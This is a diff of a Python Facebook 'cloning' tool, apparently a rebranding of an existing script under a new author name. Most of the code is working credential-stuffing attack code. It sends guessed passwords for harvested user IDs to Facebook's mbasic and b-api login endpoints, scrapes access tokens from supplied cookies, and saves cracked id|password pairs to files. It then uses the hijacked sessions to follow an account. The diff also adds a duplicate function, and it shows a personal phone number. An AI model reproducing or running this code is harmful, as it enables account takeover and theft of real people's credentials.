@@ -127,7 +127,7 @@ def Public():
 		try:
 			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
 			tes3 = json.loads(tes.text)['id']
-			print (" [] Login Successful")
+			print (" [✓] Login Successful")
 			login()
 		except KeyError:
 			print( ' [×] Login Failed ')
@@ -142,7 +142,7 @@ def Public():
 			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 			find_token = re.search("(EAAG\w+)", data.text)
 			ken=open(".token.txt", "w").write(find_token.group(1))
-			print (" [] Login Successful")
+			print (" [✓] Login Successful")
 			login()
 		except Exception as e: 
 			os.system("rm -f .token.txt")
@@ -204,11 +204,13 @@ def setting():
 		print (' [!] Choose Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 [BEST] \033[1;97m')
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 [WORKING] \033[1;97m');print ('\n [03] Method 3 (WORKING) \033[1;97m')
 	hc = input ("\n [+] Method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
+		method.append('free')
+	elif hc in ['3','03']:
 		method.append('free')
 	else:
 		method.append('mobile')
@@ -303,13 +305,13 @@ def name2():
 			else:
 				pool.submit(crack,idf,pwv)
 	
-# FBHACKER
+# MAFIYAHACKER
 def crack(idf,pwv):
 	global loop,ok,cp
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[M9FIY9-HUNTER] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[MAFIYA-XD-TOM] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,31 +326,31 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m[M9FIY9-HUNTER-OK] {idf} * {pw}')
+				print( f'\r\x1b[1;91m[MAFIYA-XD-TOM-OK] {idf} * {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [M9FIY9-HUNTER-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [MAFIYA-XD-TOM-OK] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/KING-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MAFIYA-XD-TOM-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			time.sleep(3.0)
 	loop+=1
 def free(idf,pwv):
 	global loop,ok,cp
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[M9FIYA-HUNTER] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[MAFIYA-XD-TOM] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,24 +364,62 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [Successfull-MadeehaI] {idf} * {pw}')
+				rint( f'\r\x1b[1;92m [Successfull-MadeehaI] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [M9FIY9-HUNTER] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [MAFIYA-XD-TOM] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/MR_KING-OK','a').write('%s\n' % wrt)
+				open('/sdcard/MAFIYA_XD_TOM-OK','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			time.sleep(3.0)
+			loop+=1
+def free(idf,pwv):
+	global loop,ok,cp
+	bi = random.choice([u,k,kk,b,h,hh])
+	pers = loop*100/len(id2)
+	fff = '%'
+	sys.stdout.write('\r %s[MAFIYA-XD-TOM] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.flush()
+	ua = random.choice(ugen)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			pw = pw.lower()
+			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
+			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				rint( f'\r\x1b[1;92m [Successfull-MadeehaI] {idf} | {pw}')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				coki=po.cookies.get_dict()
+				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r\x1b[1;92m [MAFIYA-XD-TOM] {idf} | {pw}')
+				wrt =('%s - %s' % (idf,pw))
+				ok.append(wrt)
+				open('/sdcard/MAFIYA_XD_TOM-OK','a').write('%s\n' % wrt)
+				follow(ses,coki)
+				break
+ 
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(3.0)
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
@@ -415,20 +455,19 @@ logo = """
 ██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
 ███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
 
-/$$      /$$  /$$$$$$  /$$$$$$$$ /$$$$$$ /$$     /$$ /$$$$$$       
-| $$$    /$$$ /$$__  $$| $$_____/|_  $$_/|  $$   /$$//$$__  $$      
-| $$$$  /$$$$| $$  \ $$| $$        | $$   \  $$ /$$/| $$  \ $$      
-| $$ $$/$$ $$| $$$$$$$$| $$$$$     | $$    \  $$$$/ | $$$$$$$$      
-| $$  $$$| $$| $$__  $$| $$__/     | $$     \  $$/  | $$__  $$      
-| $$\  $ | $$| $$  | $$| $$        | $$      | $$   | $$  | $$      
-| $$ \/  | $$| $$  | $$| $$       /$$$$$$    | $$   | $$  | $$      
-|__/     |__/|__/  |__/|__/      |______/    |__/   |__/  |__/                                                                                                                                           
+
+███╗░░░███╗░█████╗░███████╗██╗██╗░░░██╗░█████╗░
+████╗░████║██╔══██╗██╔════╝██║╚██╗░██╔╝██╔══██╗
+██╔████╔██║███████║█████╗░░██║░╚████╔╝░███████║
+██║╚██╔╝██║██╔══██║██╔══╝░░██║░░╚██╔╝░░██╔══██║
+██║░╚═╝░██║██║░░██║██║░░░░░██║░░░██║░░░██║░░██║
+╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝                                                                                                                                
                                                                    
 \x1b[1;93m----------------------------------------------------------------------------------------------------------------------
 \033[1;97m═════════════════════════════════════╮
-\x1b[1;93m[+] 𝗔𝗨𝗧𝗛𝗢𝗥   :ALONE XD M9F|¥9              \033[1;97m║
-\x1b[1;93m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :MAFIYA HUNTER               \033[1;97m║
-\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕   :(M9F|¥9-HUN73R)                   \033[1;97m║
+\x1b[1;93m[+] 𝗔𝗨𝗧𝗛𝗢𝗥   :MAFIYA XD TOM              \033[1;97m║
+\x1b[1;93m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :⃣ṕ́́́́́́́́́́́́́́́́́́́́́́́́́́́͜͜͡͡ʀ͜͜͡͡ɩ́́́́́́́́́́́́́́́́́́́́́͜͜͡͡ŋ͜͜͡͡ć́́́́́́́́́́́́́́́́͜͜͡͡ɘ͜͜͡͡-ó́́́́́́́́́́́́͜͜͡͡ʆ⃣⃣ƴ͜͜͡͡o͜͜͡͡ʋ͜͜͡͡ʀ̀̀̀̀̀̀̀̀̀̀̀̀̀̀͜͜͡͡ ʜ͜͜͡͡ɘ̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀͜͜͡͡ʌ͜͜͡͡ʀ̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀̀͜͡t͜͡⃣               \033[1;97m║
+\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕   :(MAFIYA-HUNTER)                   \033[1;97m║
 \x1b[1;93m[+] TEAM     \x1b[1;92m:(IND HACKER) \033[1;97m║
 \x1b[1;93m[+] WHATSAPP :(+919971945685)           \033[1;97m║
 \x1b[1;93m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  :    1.0.2              \033[1;97m║
@@ -445,12 +484,12 @@ class Main:
 		print(logo)
 		print("")
 		print("\033[1;94m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;94m      NOTE : APPROVAL FREE ALL USER")
+		print("\033[1;94m      NOTE : APPROVAL KE LIYE GITHUB ME FOLLOW KARE")
 		print("\033[1;94m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		
 		
 		print("")
-		print("\033[1;93m [1] 𝐅𝐈𝐑𝐒𝐓 𝐉𝐎𝐈𝐍 𝐌𝐘 𝐖𝐇𝐀𝐓𝐒𝐀𝐀𝐏 𝐆𝐑𝐎𝐔𝐏  ")
+		print("\033[1;93m [1] 𝐅𝐈𝐑𝐒𝐓 𝐅𝐎𝐋𝐋𝐎𝐖 𝐌𝐄 𝐎𝐍 𝐆𝐈𝐓𝐇𝐔𝐁😘 ")
 		print("\033[1;93m [2] 𝐄𝐗𝐈𝐓 (𝐓𝐇𝐀𝐍𝐊𝐒❤️)")
 		print("")
 		Baloch = input("\n\033[1;91m  Choose : \033[1;32m")
@@ -460,7 +499,7 @@ class Main:
 			print("    𝐍𝐢𝐤𝐤𝐚𝐥 𝐌𝐚𝐝𝐚𝐫𝐜𝐡𝐨𝐝♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://chat.whatsapp.com/FduIUmfx0DSCARoL7sPB2D")
+			os.system("xdg-open https://github.com/Mafiyahunter")
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    CHECKING APPROVAL ")
@@ -468,7 +507,7 @@ class Main:
 			input("\n\033[1;37m TYPE THE USERNAME  \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m WELCOME TO M9F|¥9-HUNTER  TOOLS")
+			print("\033[1;32m WELCOME TO MAFIYA'S WORLD")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
@@ -479,23 +518,23 @@ class Main:
 		print(" \033[1;32m[2] 𝐏𝐔𝐁𝐋𝐈𝐂 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 (𝐖𝐎𝐑𝐊𝐈𝐍𝐆)")
 		print(" \033[1;32m[3] 𝐈𝐍𝐃 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 (𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐎𝐎𝐍)")
 		print(" \033[1;32m[4] 2006-2012 (𝐖𝐎𝐑𝐊𝐈𝐍𝐆)")
-		print(" \033[1;32m[5] 2004-2008 (𝐖𝐎𝐑𝐊𝐈𝐍𝐆) ")
-		print("\033[1;32m [E] 𝐄𝐗𝐈𝐓 (𝐓𝐇𝐀𝐍𝐊𝐒❤️) \n")
-		UZAIR =input(" \033[1;32mCHOOSE : ")
-		if UZAIR in ["1", "01"]:
+		print(" \033[1;32m[5] 2004-2008 (𝐖𝐎𝐑𝐊𝐈𝐍𝐆)")
+	    print(" \033[ 1;32m[E] EXIT(𝐓𝐇𝐀𝐍𝐊𝐘𝐎𝐔❤️)")
+		mafiya =input(" \033[1;32mCHOOSE : ")
+		if mafiya in ["1", "01"]:
 			File()
-		if UZAIR in ["2", "02"]:
+		if mafiya in ["2", "02"]:
 			Public()
-		if UZAIR in ["3", "03"]:
+		if mafiya in ["3", "03"]:
 			os.system("python2 mrd1.py")
-		if UZAIR in ["4", "04"]:
+		if mafiya in ["4", "04"]:
 			self.old()
-		if UZAIR in ["5", "05"]:
+		if mafiya in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
 			print (" Select Correctly ")
-			time.sleep(1)
+			time.sleep(0.3)
 			Main()
  
 	def old(self):
@@ -519,16 +558,17 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[0;93m   𝐅𝐫𝐞𝐞 𝐌𝐨𝐝𝐞 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞")
+				print("\033[0;94m------------------------------------------------")
+				print("     \033[0;93m   𝐅𝐑𝐄𝐄 𝐌𝐎𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄❤️")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
 				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
-				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗E UNTILL DEATH")
+				print(" [!] 𝐈𝐅 𝐍𝐎 𝐑𝐄𝐒𝐔𝐋𝐓 𝐔𝐒𝐄 𝐒𝐌𝐀𝐑𝐓 𝐕𝐏𝐍 𝐅𝐎𝐑 𝐎𝐊 𝐈𝐃'𝐙")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐌𝐀𝐅𝐈𝐘𝐀 𝐓𝐎𝐎𝐋...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
@@ -897,7 +937,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [+]%s> /[M9FIY9-HUNTER]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]%s> /[MAFIYA-XD-TOM]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -914,15 +954,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[M9FIY9-HUNTER]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[MAFIYA-XD-TOM]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("M9FIY9-HUNTER-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("MAFIYA-XD-TOM-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[M9FIY9-HUNTER] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[MAFIYA-XD-TOM] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("M9FIY9-HUNTER-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("MAFIYA-XD-TOM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -950,16 +990,17 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[0;93m   Premium Mode  Activated")
+				print("\033[0;94m------------------------------------------------")
+				print("     \033[0;93m   𝐅𝐑𝐄𝐄 𝐌𝐎𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄❤️")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
 				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
-				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗦𝗠𝗔𝗥𝗧 𝗩𝗣𝗡 FOR CLONING")
+				print(" [!] 𝐈𝐅 𝐍𝐎 𝐑𝐄𝐒𝐔𝐋𝐓 𝐔𝐒𝐄 𝐒𝐌𝐀𝐑𝐓 𝐕𝐏𝐍 𝐅𝐎𝐑 𝐎𝐊 𝐈𝐃'𝐙")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING M9F|¥9-HUNTER TOOL...")
+			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐌𝐀𝐅𝐈𝐘𝐀'𝐒 𝐓𝐎𝐎𝐋...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
@@ -1328,7 +1369,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [+]>%s/[M9FIY9-HUNTER]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/[MAFIYA-XD-TOM]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1351,7 +1392,7 @@ class Main:
 				open("M9FIY9-HUNTER-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[M9FIY9-HUNTER] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[MAFIYA-XD-TOM] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1368,4 +1409,3 @@ if len(sys.argv) == 2:
  
 try:Main()
 except Exception as e:exit(str(e))
- 
